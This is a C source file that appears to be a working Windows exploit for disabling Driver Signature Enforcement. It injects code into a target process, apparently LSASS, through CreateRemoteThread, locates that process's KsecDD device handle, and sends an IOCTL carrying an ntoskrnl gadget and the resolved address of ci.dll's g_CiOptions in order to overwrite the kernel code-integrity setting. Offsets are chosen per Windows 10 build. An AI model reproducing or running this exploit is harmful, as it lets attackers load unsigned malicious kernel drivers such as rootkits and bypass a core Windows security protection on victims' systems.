#include "dse.h"


#pragma optimize ("", off)
BOOL WINAPI LsaKsec_SendIoctl()
{
	BOOL status = FALSE;
	IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER InternalStruct = { 0x2121212121212121, 0x2222222222222222 };
	PIPC_SET_FUNCTION_RETURN_PARAMETER pParameterStruct = 0;
	PSYSTEM_HANDLE_INFORMATION pSystemHandleInformation = 0;
	POBJECT_NAME_INFORMATION pObjectNameInformation = 0;
	POBJECT_BASIC_INFORMATION pObjectBasicInformation = 0;
	ULONG szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION), szObjectInformationBuffer = 0, iterator = 0;
	DWORD ObjectName[] = { 0x0044005c, 0x00760065, 0x00630069, 0x005c0065, 0x0073004b, 0x00630065, 0x00440044, 0x00000000 }; // L"\Device\KsecDD"

	pObjectBasicInformation = ((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(OBJECT_BASIC_INFORMATION));
	pParameterStruct = (PIPC_SET_FUNCTION_RETURN_PARAMETER)((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER));
	
	/*
	//if (((rip * 2) != 0x1090909090909090) && ((parameter * 2) != 0x1111111111111111) && (pObjectBasicInformation > 0))
	if ((InternalStruct.rip != (0x1090909090909090 * 2)) && (InternalStruct.parameter != (0x1111111111111111 * 2)) && (pObjectBasicInformation > 0))
	{
		pParameterStruct = (PIPC_SET_FUNCTION_RETURN_PARAMETER)((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER));
		//pIpcSetFunctionReturnParameter = (PIPC_SET_FUNCTION_RETURN_PARAM)((PLOCALALLOC)0x3131313131313131)(LPTR, (sizeof(UINT64) * 2));
	}
	*/
	
	if (pParameterStruct > 0)
	{
		pParameterStruct->pInternalStruct = &InternalStruct;
		pParameterStruct->parameter = (UINT16)0;

		while ((((PNTQUERYSYSTEMINFORMATION)0x4141414141414141)(0x10, (PVOID)pSystemHandleInformation, szSystemInformationBuffer, NULL)) != STATUS_SUCCESS)
		{
			if (pSystemHandleInformation)
			{
				((PLOCALFREE)0x3232323232323232)(pSystemHandleInformation);
				szSystemInformationBuffer *= 2;
			}
			pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)((PLOCALALLOC)0x3131313131313131)(LPTR, szSystemInformationBuffer);
			if (!pSystemHandleInformation)
			{
				break;
			}
		}

		if (pSystemHandleInformation)
		{
			for (iterator = 0; iterator < pSystemHandleInformation->HandleCount; iterator++)
			{
				if (pSystemHandleInformation->Handles[iterator].ProcessId == (ULONG)(*(PULONG)((PBYTE)__readgsqword(0x30) + 0x40)))
				{
					if (((PNTQUERYOBJECT)0x4242424242424242)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, ObjectBasicInformation, (PVOID)pObjectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION), &szObjectInformationBuffer) == STATUS_SUCCESS)
					{
						if (!pObjectBasicInformation->NameInformationLength)
							szObjectInformationBuffer = MAX_PATH * sizeof(WCHAR);
						else
							szObjectInformationBuffer = pObjectBasicInformation->NameInformationLength;

						pObjectNameInformation = ((PLOCALALLOC)0x3131313131313131)(LPTR, (SIZE_T)szObjectInformationBuffer);
						if (pObjectNameInformation)
						{
							((PNTQUERYOBJECT)0x4242424242424242)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 1, (PVOID)pObjectNameInformation, szObjectInformationBuffer, &szObjectInformationBuffer);
							if (pObjectNameInformation->Name.Buffer != NULL)
							{
								if (((PWCSCMP)0x3333333333333333)((wchar_t*)pObjectNameInformation->Name.Buffer, (wchar_t*)ObjectName) == 0)
								{
									status = ((PDEVICEIOCONTROL)0x4343434343434343)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 0x39006F, (LPVOID)pParameterStruct, 16, NULL, 0, NULL, NULL);
									if (status)
									{
										break;
									}
								}
							}
							((PLOCALFREE)0x3232323232323232)(pObjectNameInformation);
						}
					}
				}
			}
			if (pObjectNameInformation)
			{
				((PLOCALFREE)0x3232323232323232)(pObjectNameInformation);
			}
			((PLOCALFREE)0x3232323232323232)(pSystemHandleInformation);
		}
		((PLOCALFREE)0x3232323232323232)(pParameterStruct);
	}
	if (pObjectBasicInformation)
	{
		((PLOCALFREE)0x3232323232323232)(pObjectBasicInformation);
	}

	return status;

}
BOOL WINAPI LsaKsec_SendIoctl_end()
{
	return 0;
}
#pragma optimize ("", on)

WINDOWS_VERSION GetOsBuildNumber()
{
	NTSTATUS status = 0;
	WINDOWS_VERSION iVersion = WINDOWS_UNSUPPORTED;
	RTL_OSVERSIONINFOW RtlOSVersion = { 0 };
	PRTLGETVERSION RtlGetVersion = 0;
	HMODULE hModule = 0;

	hModule = GetModuleHandle(L"ntdll.dll");
	if (hModule)
	{
		RtlGetVersion = (PRTLGETVERSION)GetProcAddress(hModule, "RtlGetVersion");
		if (RtlGetVersion)
		{
			RtlOSVersion.dwOSVersionInfoSize = sizeof(RtlOSVersion);
			status = RtlGetVersion(&RtlOSVersion);

			if ((status == STATUS_SUCCESS) && (RtlOSVersion.dwMajorVersion == 10))
			{
				switch (RtlOSVersion.dwBuildNumber)
				{
				case 14393:
					iVersion = WINDOWS_REDSTONE_1;
					break;

				case 15063:
					iVersion = WINDOWS_REDSTONE_2;
					break;

				case 16299:
					iVersion = WINDOWS_REDSTONE_3;
					break;

				case 17134:
					iVersion = WINDOWS_REDSTONE_4;
					break;

				case 17763:
					iVersion = WINDOWS_REDSTONE_5;
					break;

				case 18362:
					iVersion = WINDOWS_19H1;
					break;

				case 18363:
					iVersion = WINDOWS_19H2;
					break;

				case 19041:
					iVersion = WINDOWS_20H1;
					break;

				case 19042:
					iVersion = WINDOWS_20H2;
					break;

				case 19043:
					iVersion = WINDOWS_21H1;
					break;

				case 19044:
					iVersion = WINDOWS_21H2;
					break;

				case 19045:
					iVersion = WINDOWS_22H2;
					break;

				default:
					iVersion = WINDOWS_UNSUPPORTED;
					break;
				}
			}

			SecureZeroMemory(&RtlOSVersion, sizeof(RTL_OSVERSIONINFOW));
		}
	}

	return iVersion;

}

LPVOID GetDriverBaseAddress(LPSTR DeviceDriverName)
{
	LPVOID tmp_array = 0;
	LPVOID result = 0;
	DWORD needed = 0, needed2 = 0;
	DWORD64 i = 0;
	char name[MAX_PATH];
	int j = 0;

	EnumDeviceDrivers(tmp_array, 0, &needed);
	if (needed > 0)
	{
		tmp_array = (LPVOID)LocalAlloc(LPTR, (SIZE_T)needed);
		if (tmp_array)
		{
			if (EnumDeviceDrivers(tmp_array, needed, &needed2))
			{
				for (i = 0; i < needed / sizeof(LPVOID); i++)
				{
					GetDeviceDriverBaseNameA(*(PVOID*)(PVOID*)((PBYTE)tmp_array + (8 * i)), name, MAX_PATH);
					if (_stricmp(name, DeviceDriverName) == 0)
					{
						RtlCopyMemory(&result, (PBYTE)tmp_array + (8 * i), sizeof(LPVOID));
						break;						
					}
				}
			}
			//SecureZeroMemory(&tmp_array, (SIZE_T)needed);
			LocalFree(tmp_array);
		}
	}

	return result;

}

int main(int argc, char* argv[])
{
	REPLACEABLE_POINTER ReplPointers[] = {
		{ L"kernel32.dll", "DeviceIoControl", (PVOID)0x4343434343434343, NULL},
		{ L"kernel32.dll", "LocalAlloc", (PVOID)0x3131313131313131, NULL },
		{ L"kernel32.dll", "LocalFree", (PVOID)0x3232323232323232, NULL },
		{ L"ntdll.dll", "wcscmp", (PVOID)0x3333333333333333, NULL },
		{ L"ntdll.dll", "NtQuerySystemInformation", (PVOID)0x4141414141414141, NULL },
		{ L"ntdll.dll", "NtQueryObject", (PVOID)0x4242424242424242, NULL },
		{ NULL, NULL, (PVOID)0x2121212121212121, NULL }, // gadget
		{ NULL, NULL, (PVOID)0x2222222222222222, NULL } // g_cioptions
	};
	WINDOWS_VERSION windows_version = WINDOWS_UNSUPPORTED;
	LPVOID RemoteHandler = 0, LocalHandler = 0;
	SIZE_T szRemoteHandler = (SIZE_T)((PBYTE)LsaKsec_SendIoctl_end - (PBYTE)LsaKsec_SendIoctl);
	UINT64 ntoskrnl_gadget = 0;
	UINT64 ci_g_cioptions = 0;
	DWORD FakePtrsCount = sizeof(ReplPointers) / sizeof(REPLACEABLE_POINTER), i = 0;
	HANDLE hProcess = 0, hThread = 0;
	
	windows_version = GetOsBuildNumber();
	if (windows_version == WINDOWS_UNSUPPORTED) // correct
	{
		return 0;
	}
	else if (!EnablePrivilege(L"SeDebugPrivilege"))
	{
		return 0;
	}

	ntoskrnl_gadget = (UINT64)((PBYTE)GetDriverBaseAddress("ntoskrnl.exe") + NTOSKRNL_GADGET_OFFSET[windows_version]);
	ci_g_cioptions = (UINT64)((PBYTE)GetDriverBaseAddress("ci.dll") + CI_G_CI_OPTIONS_OFFSET[windows_version]);
	
	if ((ntoskrnl_gadget > NTOSKRNL_GADGET_OFFSET[windows_version]) && (ci_g_cioptions > CI_G_CI_OPTIONS_OFFSET[windows_version]))
	{
		for (i = 0; i < FakePtrsCount; i++)
		{
			if (ReplPointers[i].FakePtr == (PVOID)0x2121212121212121)
				ReplPointers[i].RealPtr = (PVOID)ntoskrnl_gadget;
			if (ReplPointers[i].FakePtr == (PVOID)0x2222222222222222)
				ReplPointers[i].RealPtr = (PVOID)ci_g_cioptions;
		}
	}

	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, atoi(argv[1]));
	if (hProcess != INVALID_HANDLE_VALUE)
	{
		LocalHandler = (LPVOID)LocalAlloc(LPTR, szRemoteHandler);
		if (LocalHandler)
		{
			RtlCopyMemory(LocalHandler, LsaKsec_SendIoctl, szRemoteHandler);
			RemoteHandler = ReplaceFakePointers(hProcess, LocalHandler, (DWORD)szRemoteHandler, (PREPLACEABLE_POINTER)&ReplPointers, FakePtrsCount);
			if (RemoteHandler != NULL)
			{
				hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteHandler, NULL, 0, NULL);
				if ((hThread != INVALID_HANDLE_VALUE) && (hThread != 0))
				{
					WaitForSingleObject(hThread, INFINITE);
					CloseHandle(hThread);
				}

				VirtualFreeEx(hProcess, RemoteHandler, 0, MEM_RELEASE);
			}
			
			LocalFree(LocalHandler);
		}
		
		CloseHandle(hProcess);
	}

	return 0;
}




/*
* 
* 
* PSYSTEM_HANDLE_INFORMATION pSystemHandleInformation = 0;
	POBJECT_NAME_INFORMATION pObjectNameInformation = 0;
	OBJECT_BASIC_INFORMATION objectBasicInformation = { 0 };
	WINDOWS_VERSION windows_version = WINDOWS_UNSUPPORTED;
	UINT64 ntoskrnl_gadget = 0;
	UINT64 ci_g_cioptions = 0;
	HMODULE ntdll = 0;
	ULONG return_length = 0, szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION), szObjectInformationBuffer = 0;
	DWORD i = 0;

while (NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x10, (PVOID)pSystemHandleInformation, szSystemInformationBuffer, NULL) != STATUS_SUCCESS)
	{
		if (pSystemHandleInformation)
		{
			LocalFree(pSystemHandleInformation);
			szSystemInformationBuffer *= 2;
		}

		pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)LocalAlloc(LPTR, (SIZE_T)szSystemInformationBuffer);
		if (!pSystemHandleInformation)
		{
			break;
		}

	}


	if (pSystemHandleInformation)
	{
		for (i = 0; i < pSystemHandleInformation->HandleCount; i++)
		{
			if (pSystemHandleInformation->Handles[i].ProcessId == (ULONG)GetCurrentProcessId())
			{
				if (NtQueryObject((HANDLE)pSystemHandleInformation->Handles[i].Handle, ObjectBasicInformation, &objectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION), &szObjectInformationBuffer) == STATUS_SUCCESS)
				{
					if (!objectBasicInformation.NameInformationLength)
						szObjectInformationBuffer = MAX_PATH * sizeof(WCHAR);
					else
						szObjectInformationBuffer = objectBasicInformation.NameInformationLength;

					pObjectNameInformation = (POBJECT_NAME_INFORMATION)LocalAlloc(LPTR, szObjectInformationBuffer);
					NtQueryObject((HANDLE)pSystemHandleInformation->Handles[i].Handle, 1, pObjectNameInformation, szObjectInformationBuffer, &szObjectInformationBuffer);
					if (pObjectNameInformation->Name.Buffer != NULL)
					{
						printf("0x%-016p\t: %ws\n", (PVOID)pSystemHandleInformation->Handles[i].Handle, pObjectNameInformation->Name.Buffer);
					}

					SecureZeroMemory(&objectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION));
					LocalFree(pObjectNameInformation);
				}
			}
		}

		LocalFree(pSystemHandleInformation);

	}


*/